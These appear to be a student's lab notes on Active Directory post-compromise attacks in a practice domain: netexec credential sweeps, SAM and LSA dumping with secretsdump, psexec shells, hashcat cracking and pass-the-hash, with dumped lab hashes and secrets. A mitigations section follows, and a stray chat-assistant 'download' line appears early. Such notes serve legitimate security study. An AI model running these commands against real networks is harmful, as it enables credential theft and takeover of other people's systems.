## Introduction

## Overview

- Focus on **post-compromise attacks** targeting Active Directory.
- **Prerequisite**: Access to a form of credentials (e.g., username/password, shell access, etc.).
    - These attacks are only effective after gaining initial compromise.

## Attacks Covered

1. **Pass the Hash**
2. **Pass the Password**
3. **Token Impersonation**
4. **Kerberoasting**
5. **GPP (Group Policy Preferences) Password Attacks**
6. **Golden Ticket Attacks**

## Key Points

- These attacks leverage compromised credentials for greater access in a network.
- Considered **powerful tools** for network exploitation post-compromise.
- Initial overview provided; in-depth exploration follows in later sections.

## Next Steps

- Begin with **Pass the Hash** and **Pass the Password**.

---

I will save this in a `.txt` format for your reference.

The notes have been saved. You can download the file using the link below:

Download Active Directory Post Compromise Attacks Notes

## Pass the Hash Overview

## Overview

- **Goal:** Move laterally within a network by leveraging compromised credentials.
- Techniques involve **passing credentials** (passwords or hashes) without requiring the actual password to be cracked.

## Key Techniques

### **Pass the Hash**

- Utilize dumped password hashes from compromised accounts.
- Hashes are "passed" instead of being cracked, enabling access to systems without needing plaintext passwords.

### **Pass the Password**

- Directly use the obtained password to authenticate across the network.

---

## Tools and Steps

### **1. CrackMapExec (replaced with Netexec)**

- Tool used to test credentials across a subnet.
- Accepts:
    - Username
    - Domain
    - Password
- Attempts authentication across multiple machines in a subnet to identify valid access.

### **2. PSExec**

- Tool for remote command execution on compromised machines.
- Steps:
    - Use PSExec with dumped local user hashes.
    - Attempt to pass those hashes across the network (e.g., with the `-hash` flag).

---

## Key Points

1. **Credentials Source:**
    - Credentials are obtained from hash dumps or captured using tools like Responder.
2. **Local User Reuse Vulnerability:**
    - Local accounts often share the same password across the network.
    - Exploitation of shared admin passwords/hashes enables control over multiple systems.
3. **Cracking Passwords Not Required:**
    - Local user hashes can be passed directly without cracking.
    - Huge benefit for quick exploitation.

---

## Risks for Network Admins

- **Reused Passwords:**
    - A single compromised local administrator account can lead to full network compromise.
- **Recommendations:**
    - Avoid reusing passwords across local accounts.
    - Regularly update and uniquely configure passwords for administrative accounts.

---

## Next Steps

1. **Install and configure CrackMapExec.**
2. Explore its capabilities:
    - Test password reuse and hash exploitation across the network.

---

## Installing Netexec

```PowerShell
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

  

## Pass the Password Attacks

### Setup and Environment

- Machines:
    - 1 Windows Server
    - 2 Windows 10 machines
- Tool Used: Netexec

---

### Basic Usage of Netexec

- **Command for help menu:**
    
    ```Shell
    netexec --help
    ```
    
- **Input requirements:**
    - Target: IP, range, or CIDR notation
    - Credentials: Username, domain, and password

---

### Netexec - Pass the Password Example

### Steps Taken:

1. **Targeting Subnet**:
    
    Command:
    
    ```Shell
    netexec smb 192.168.213.0/24 -u fcastle -d marvel.local -p password@01
    ```
    
    - Sweep entire subnet using `fCastle` credentials.
2. **Results Interpretation**:
    
    ```Bash
    ┌─[root@parrot]─[/home/z3tssu/TCM]
    └──╼ \#netexec smb 192.168.213.0/24 -u fcastle -d marvel.local -p Password@01
    SMB         192.168.213.130 445    PUNISHER         [*] Windows 10 / Server 2019 Build 19041 x64 (name:PUNISHER) (domain:marvel.local) (signing:False) (SMBv1:False)
    SMB         192.168.213.132 445    IRONMAN          [*] Windows 10 / Server 2019 Build 19041 x64 (name:IRONMAN) (domain:marvel.local) (signing:False) (SMBv1:False)
    SMB         192.168.213.158 445    HYDRA-DC         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HYDRA-DC) (domain:marvel.local) (signing:True) (SMBv1:False)
    SMB         192.168.213.132 445    IRONMAN          [+] marvel.local\fcastle:Password@01 (Pwn3d!)
    SMB         192.168.213.158 445    HYDRA-DC         [+] marvel.local\fcastle:Password@01 
    SMB         192.168.213.130 445    PUNISHER         [+] marvel.local\fcastle:Password@01 (Pwn3d!)
    Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
    ```
    
    ![[/image 63.png|image 63.png]]
    
    - Targeted machines:
        - `Hydra DC` → No SMB access.
        - `Spider-Man` → Access gained (user credentials valid).
        - `Punisher` → Previously known; reconfirmed access.

---

### Netexec - Dumping the SAM Example

```Bash
nxc smb 192.168.213.0/24 -d marvel.local -u fcastle -p Password@01 --sam
```

### Output

```Bash
┌─[root@parrot]─[/home/z3tssu/TCM/impacket]
└──╼ \#nxc smb 192.168.213.0/24 -d marvel.local -u fcastle -p Password@01 --sam
SMB         192.168.213.130 445    PUNISHER         [*] Windows 10 / Server 2019 Build 19041 x64 (name:PUNISHER) (domain:marvel.local) (signing:False) (SMBv1:False)
SMB         192.168.213.158 445    HYDRA-DC         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HYDRA-DC) (domain:marvel.local) (signing:True) (SMBv1:False)
SMB         192.168.213.132 445    IRONMAN          [*] Windows 10 / Server 2019 Build 19041 x64 (name:IRONMAN) (domain:marvel.local) (signing:False) (SMBv1:False)
SMB         192.168.213.130 445    PUNISHER         [+] marvel.local\fcastle:Password@01 (Pwn3d!)
SMB         192.168.213.158 445    HYDRA-DC         [+] marvel.local\fcastle:Password@01 
SMB         192.168.213.132 445    IRONMAN          [+] marvel.local\fcastle:Password@01 (Pwn3d!)
SMB         192.168.213.130 445    PUNISHER         [*] Dumping SAM hashes
SMB         192.168.213.132 445    IRONMAN          [*] Dumping SAM hashes
SMB         192.168.213.130 445    PUNISHER         Administrator:500:aad3b435b51404eeaad3b435b51404ee:627a55d9b030f24af2c8f1a73a8b079a:::
SMB         192.168.213.130 445    PUNISHER         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.213.130 445    PUNISHER         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.213.132 445    IRONMAN          Administrator:500:aad3b435b51404eeaad3b435b51404ee:627a55d9b030f24af2c8f1a73a8b079a:::
SMB         192.168.213.132 445    IRONMAN          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.213.130 445    PUNISHER         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:16f0162fe46f7f1af9939f27ad5a8d6d:::
SMB         192.168.213.130 445    PUNISHER         [+] Added 4 SAM hashes to the database
SMB         192.168.213.132 445    IRONMAN          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.213.132 445    IRONMAN          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:16f0162fe46f7f1af9939f27ad5a8d6d:::
SMB         192.168.213.132 445    IRONMAN          nanty:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.213.132 445    IRONMAN          [+] Added 5 SAM hashes to the database
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

---

### PSExec Usage for getting a shell on a machine:

- For a specific machine with valid credentials:
    
    ```Shell
    python3 psexec.py marvel/fcastle:Password@01@192.168.213.130
    ```
    
    - Use this to get remote access on a machine with the entered credentials

- Output
    
    ```Bash
    ┌─[root@parrot]─[/home/z3tssu/TCM/impacket/examples]
    └──╼ \#python3 psexec.py marvel/tstark:Password@01@192.168.213.130
    Impacket v0.11.0 - Copyright 2023 Fortra
    
    [*] Requesting shares on 192.168.213.130.....
    [*] Found writable share ADMIN$
    [*] Uploading file YoDJJpBG.exe
    [*] Opening SVCManager on 192.168.213.130.....
    [*] Creating service TUzF on 192.168.213.130.....
    [*] Starting service TUzF.....
    [!] Press help for extra shell commands
    Microsoft Windows [Version 10.0.19045.5247]
    (c) Microsoft Corporation. All rights reserved.
    
    C:\Windows\system32> hostname
    Punisher
    
    C:\Windows\system32> 
    ```
    

---

### Next Steps

1. **Hash Dumping**:
    - Extract hashes from compromised machines.
    - Use tools like **SecretsDump** for further exploitation.
2. **Password Cracking**:
    - Attempt to crack stored hashes for further privilege escalation.
3. **Pass the Hash**:
    - Use hashes for lateral movement without password cracking.

---

## Dumping SAM & LSA Hashes with secretdump.py

### Overview

- We used a password to pass around the network
- We have found that some machines have the same local admin
- We try and get access on those machines using psexec or other methods using metasploit
    - But it can get noisy and get picked up by Antivirus of Windows Defender as psexec will try and copy a remote connection file on the machine that it is targeting

---

### secretsdump.py usage

- Part of the **Impacket toolkit**.
- Extracts the following from machines:
    - **SAM hashes** (local accounts).
    - **LSA secrets**.
    - **DPAPI keys** (less critical for initial focus).

### Command Syntax

```Bash
python3 secretsdump.py marvel/fcastle:Password@01@192.168.213.130
```

- **Output**
    
    ```Bash
    ┌─[root@parrot]─[/home/z3tssu/TCM/impacket/examples]
    └──╼ \#python3 secretsdump.py marvel/fcastle:Password@01@192.168.213.130
    Impacket v0.11.0 - Copyright 2023 Fortra
    
    [*] Service RemoteRegistry is in stopped state
    [*] Service RemoteRegistry is disabled, enabling it
    [*] Starting service RemoteRegistry
    [*] Target system bootKey: 0xefd6decb9e6c08b7f23bd5ea3ac84e6e
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:627a55d9b030f24af2c8f1a73a8b079a:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:16f0162fe46f7f1af9939f27ad5a8d6d:::
    [*] Dumping cached domain logon information (domain/username:hash)
    MARVEL.LOCAL/fcastle:$DCC2$10240\#fcastle\#32d5f2cd7f056aaebcf6325a4d839bd0: (2024-12-29 17:55:06)
    MARVEL.LOCAL/tstark:$DCC2$10240\#tstark\#3cc28255302a90f5b1ab6f045ba1e338: (2024-12-29 17:56:45)
    MARVEL.LOCAL/Administrator:$DCC2$10240\#Administrator\#29b1481e41f1c7de407ad8809b417687: (2024-12-30 15:04:07)
    MARVEL.LOCAL/superuser:$DCC2$10240\#superuser\#97174eb87bf7a19dd0b27f67ec01471c: (2024-12-30 17:01:49)
    [*] Dumping LSA Secrets
    [*] $MACHINE.ACC 
    MARVEL\PUNISHER$:aes256-cts-hmac-sha1-96:be7397210e0f734980973aedf254969de6ea07a92ca64ef314c30af09e7939c1
    MARVEL\PUNISHER$:aes128-cts-hmac-sha1-96:288ccbd7de0607a9ed2f16c1e30db81f
    MARVEL\PUNISHER$:des-cbc-md5:80bf5e3e7f19f1ba
    MARVEL\PUNISHER$:plain_password_hex:8451e880aac98e08c0582bfd687c65981b853e640439c74168733a587719177ac5364d5fd809aba27c5b33360617b7d8eae1d4f4bb56a636eac23553e87e1eba80e06d9586d7c70a9f6d2f78b07f3b13a6f0d6c5d4f22bc933cfef31fa8b54acb936e9af1a0271fdb57163da5bf8807ca2578130dd61ea2c73ff3a306c11b049c9d4f5dccb1e40e80c82ed1101f534dbf08ca6afb4f88c81025ff65692988ca943e46a6141ed2b4780e6f696c75bcd8ee898b979825bbb98b967d2807c7cf48af9fdbbdeed5a75e44128c8385bcfbac2e3951f410d184c3edb8cf9eef0d5c1229e02386f62569eaae3f26dbdeb0fe790
    MARVEL\PUNISHER$:aad3b435b51404eeaad3b435b51404ee:60b26a962e4d729d10143f9e02b6862c:::
    [*] DPAPI_SYSTEM 
    dpapi_machinekey:0xf376b79d8700c7be77f146b09d4bb6b82f1dad80
    dpapi_userkey:0x9c836c63bf06b4da3aaa9e126343914adb18c96b
    [*] NL$KM 
     0000   26 F2 F6 B9 D4 F7 9A 9B  00 D9 CC 60 F5 45 11 EC   &..........`.E..
     0010   3E EE C9 4E 17 7B 98 95  96 9E 54 A4 3F F0 54 FC   >..N.{....T.?.T.
     0020   DA 0C 07 9C 16 4B 81 08  AF 7E 0F 80 6D F4 43 FD   .....K...~..m.C.
     0030   82 06 DE EC 93 56 E8 C9  37 D4 74 52 76 3D D7 5B   .....V..7.tRv=.[
    NL$KM:26f2f6b9d4f79a9b00d9cc60f54511ec3eeec94e177b9895969e54a43ff054fcda0c079c164b8108af7e0f806df443fd8206deec9356e8c937d47452763dd75b
    [-] NTDSHashes.__init__() got an unexpected keyword argument 'skipUser'
    [*] Cleaning up... 
    [*] Stopping service RemoteRegistry
    [*] Restoring the disabled state for service RemoteRegistry
    ```
    

### Output Explanation

- **SAM hashes**: Critical for lateral movement and cracking.
- **LSA Secrets**: Will be explored later with tools like Mimikatz.

---

### Hash Validation

1. **Identify Password Reuse**:
    - Compare extracted hashes to check for reuse across accounts or machines.
    - Reused hashes indicate potential for lateral movement without cracking passwords.
2. **Quick Example**:
    - Use `gedit` or a similar text editor to organize and visually inspect hashes for duplicates.

---

### Next Steps

1. **Crack Hashes**:
    - Attempt to crack hashes to identify plaintext passwords for further access.
2. **Pass the Hash**:
    - Use valid hashes for lateral movement across the network.
    - Cracking is optional if hash reuse allows movement without password recovery.

---

### Observations

- Reused Administrator passwords are common and present a significant risk:
    - Allows attackers to use the same hash across multiple systems.
- Even if cracking fails, **Pass the Hash** is a powerful alternative.

---

## Cracking NTLM hashes with Hashcat

## Overview

- **Goal**: Crack password hashes retrieved from machines using **SecretsDump**.
- Focus on analyzing hash types and identifying weak passwords.

---

## Key Concepts

1. **Hash Types**:
    - **NTLM (module 1000)**: Can be cracked and passed.
    - **NTLMv2**: Cannot be passed around the network; cracking is required for further use.
2. **Source of Hashes**:
    - Retrieved using **SecretsDump** (from SAM file).
    - Example of common findings:
        - Weak passwords like `password1` or `password2`.
        - Blank passwords (accounts likely disabled).

---

## Cracking Process with Hashcat

1. **Setup**:
    - Organize hashes into a `.txt` file (e.g., `hashes.txt`).
    - Ensure that a wordlist is available (e.g., `rockyou.txt`).
2. **Command**:
    
    ```Shell
    hashcat64.exe -m 1000 -a 0 hashes.txt rockyou.txt -O
    ```
    
    - `m 1000`: Specifies NTLM module.
    - `a 0`: Default attack mode (dictionary attack).
    - `O`: Enables optimized mode for performance.
    - Results will show cracked passwords.

---

## Example Outputs

- **Cracked Passwords**:
    - `password1` and `password2` were identified as weak passwords.
    - Example:
        
        ```Plain
        User1: password1
        Admin: password2
        ```
        
- **Blank Passwords**:
    - Indicates potential **disabled accounts** (not usable for lateral movement).

---

## Pass the Hash Attacks

### Overview

- **Pass the Hash**: Utilize NTLM hashes for lateral movement in a network.
- Techniques include:
    - Using Netexec to test hashes.
    - Authenticating with **PSExec** without needing plaintext passwords.

---

### Using Netexec to pass the Hash

1. **Command for Passing the Hash**:
    
    ```Shell
    netexec smb 192.168.57.0/24 -u "Frank Castle" -H <NTLM_HASH> --local
    ```
    
    - **Arguments**:
        - `192.168.57.0/24`: Target subnet in CIDR notation.
        - `u`: Username of the local admin account.
        - `H`: NTLM hash (second half from the dumped hash).
        - `-local`: Specifies targeting local accounts.
    - **Indicators**:
        - **Green Highlight**: Hash is likely valid.
        - **Pwned (pwn)**: Confirmed successful access.
2. **Results**:
    - Green results may occasionally produce false positives.
    - Pwned results indicate full access and control of the target machine.
    - Once you have confirmed the above, you can use psexec to authenticate with the hash on other machines

---

### Authenticating with PSExec

1. **Command Syntax**:
    
    ```Shell
    psexec.py "Frank Castle"@192.168.57.141 -hashes <LM_HASH>:<NT_HASH>
    ```
    
    - **Arguments**:
        - `Frank Castle`: Username.
        - `192.168.57.141`: Target machine IP.
        - `<LM_HASH>:<NT_HASH>`: Full hash (both LM and NT portions required).
2. **Possible Outcomes**:
    - Successful share access and ability to upload/get a shell.
    - Login success but insufficient privileges for admin actions (e.g., uploading tools).
    - Login failure if the hash is invalid or account lacks permissions on the machine.

---

### Observations and Risk Assessment

1. **Importance of Local Admin Accounts**:
    - Reusing local admin passwords across the network can lead to full compromise.
    - Even advanced defenses like Privileged Access Management (PAM) can be bypassed if local passwords are overlooked.
2. **Practical Example**:
    - An organization using expensive PAM tools (e.g., CyberArk, Thycotic) still fell victim due to local admin password reuse, allowing attackers to compromise an entire domain.

---

## Pass Attack Mitigations

## Overview

- Complete mitigation of **Pass the Hash** and **Pass the Password** is challenging but possible to manage effectively by implementing robust defensive measures.
- Proper configurations can make an attacker’s lateral movement significantly more difficult.

---

## Key Mitigation Strategies

### 1. **Limit Account Reuse**

- Avoid reusing local administrator accounts across multiple machines.
- Reusing credentials allows attackers to gain access to multiple systems easily.

### 2. **Strong and Unique Local Admin Passwords**

- Enforce complex, unique passwords for each system’s local administrator account.
- Consider tools like **Microsoft Local Administrator Password Solution (LAPS)** to automate unique password management.

### 3. **Enforce Least Privilege**

- Assign the minimal required privileges for local admin accounts.
- Limit the number of accounts with local admin rights.

### 4. **Password Strength Policies**

- Strong password policies help prevent cracking attacks.
- Focus on securing **NTLMv2 hashes**, as cracking them enables lateral movement via password use.

### 5. **Privileged Access Management (PAM)**

- Utilize PAM solutions, such as **CyberArk** or **Thycotic**, for domain account management:
    - Implement password checkout systems.
    - Rotate privileged account passwords automatically after a short duration (e.g., 8 hours).
- PAM systems are critical but can be bypassed by poor local password management.

---

## Lessons from Real-World Examples

- **Weak Local Admin Passwords**:
    - Even organizations with million-dollar PAM systems can be compromised due to weak or reused local administrator passwords.
    - Example: A security assessment bypassed PAM defenses because weak, reused local admin passwords were leveraged for network-wide compromise.

---

## Recommendations

1. **Password Audits**:
    - Regularly check for weak or reused passwords across machines.
2. **Implement LAPS**:
    - Centralize management of local admin passwords.
3. **Train IT Teams**:
    - Educate teams about the risks of reusing credentials and best practices for local account management.
4. **Invest in PAM Systems**:
    - While expensive, PAM solutions significantly reduce exposure if implemented properly.

---

## Next Steps

- Learn about **Token Impersonation Attacks**:
    - An advanced technique that uses tokens to impersonate users.
    - These attacks are powerful and will be covered in the next video.

---